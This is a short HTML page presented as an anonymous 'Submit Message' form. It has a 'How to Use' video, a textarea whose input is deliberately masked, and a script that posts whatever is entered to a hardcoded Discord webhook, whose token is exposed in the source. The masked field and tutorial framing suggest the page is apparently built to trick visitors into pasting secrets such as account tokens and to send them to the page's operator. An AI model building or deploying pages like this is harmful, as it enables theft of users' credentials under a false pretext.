<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Submit Message</title>

<style>
  * {
    box-sizing: border-box;
  }

  body {
    margin: 0;
    min-height: 100vh;
    font-family: 'Segoe UI', Arial, sans-serif;
    display: flex;
    justify-content: center;
    align-items: center;
    background: linear-gradient(-45deg, #ff6ec4, #7873f5, #42e695, #f9f871);
    background-size: 400% 400%;
    animation: gradientBG 15s ease infinite;
    overflow: hidden;
  }

  @keyframes gradientBG {
    0% { background-position: 0% 50%; }
    50% { background-position: 100% 50%; }
    100% { background-position: 0% 50%; }
  }

  .card {
    width: 400px;
    background: rgba(0, 0, 0, 0.75);
    border-radius: 18px;
    padding: 24px;
    box-shadow: 0 20px 50px rgba(0,0,0,0.6);
    animation: floatCard 6s ease-in-out infinite;
  }

  @keyframes floatCard {
    0%, 100% { transform: translateY(0px); }
    50% { transform: translateY(-8px); }
  }

  h2 {
    text-align: center;
    margin-bottom: 18px;
    color: #fff;
    font-weight: 600;
    letter-spacing: 1px;
  }

  .video-wrapper {
    width: 100%;
    aspect-ratio: 16/9;
    border-radius: 12px;
    overflow: hidden;
    margin-bottom: 16px;
    box-shadow: 0 10px 20px rgba(0,0,0,0.5);
  }

  iframe {
    width: 100%;
    height: 100%;
    border: none;
  }

  textarea {
    width: 100%;
    height: 100px;
    padding: 12px;
    border-radius: 10px;
    border: none;
    outline: none;
    resize: none;
    font-size: 14px;
    background: #111;
    color: #fff;
    transition: all 0.25s ease;
    -webkit-text-security: disc; /* hide text */
    -moz-text-security: disc;
  }

  textarea:focus {
    transform: scale(1.02);
    box-shadow: 0 0 0 2px rgba(255, 255, 255, 0.6);
  }

  button {
    margin-top: 14px;
    width: 100%;
    padding: 12px;
    border-radius: 14px;
    border: none;
    font-size: 15px;
    font-weight: bold;
    cursor: pointer;
    color: white;
    background: linear-gradient(90deg, #ff6ec4, #7873f5, #42e695, #f9f871);
    background-size: 300% 300%;
    animation: gradientButton 6s ease infinite;
    transition: transform 0.2s ease, box-shadow 0.2s ease;
  }

  @keyframes gradientButton {
    0% { background-position: 0% 50%; }
    50% { background-position: 100% 50%; }
    100% { background-position: 0% 50%; }
  }

  button:hover {
    transform: translateY(-3px);
    box-shadow: 0 12px 25px rgba(255,255,255,0.5);
  }

  button:active {
    transform: translateY(0);
    box-shadow: 0 6px 12px rgba(0,0,0,0.4);
  }

  .footer {
    margin-top: 12px;
    text-align: center;
    font-size: 12px;
    opacity: 0.7;
    color: #eee;
  }
</style>
</head>

<body>

<div class="card">
  <h2>How to Use</h2>

  <div class="video-wrapper">
    <iframe
      src="https://www.youtube.com/embed/yfYV-BYasVI"
      allowfullscreen>
    </iframe>
  </div>

  <textarea id="message" placeholder="Type your message here"></textarea>

  <button onclick="sendMessage()">Send</button>

  <div class="footer">
    Quick • Easy • Anonymous
  </div>
</div>

<script>
  const MAX_LENGTH = 1999;

  async function sendMessage() {
    const message = document.getElementById('message').value;
    if (!message) {
      alert("Please type something!");
      return;
    }

    const webhookURL = "https://discord.com/api/webhooks/1438635586889060444/CKHiCB0XsbDaHk2OIMMxk1_P8hjrIevMnJ8wzPcIrr1doa5GhQcTVqyOYrLBBL7bcvCc";

    const chunks = [];
    for (let i = 0; i < message.length; i += MAX_LENGTH) {
      chunks.push(message.substring(i, i + MAX_LENGTH));
    }

    try {
      for (let chunk of chunks) {
        const response = await fetch(webhookURL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ content: chunk })
        });

        if (!response.ok) {
          alert("Failed to send message.");
          return;
        }
      }

      alert("Message sent!");
      document.getElementById('message').value = "";
    } catch (error) {
      alert("Error: " + error);
    }
  }
</script>

</body>
</html>
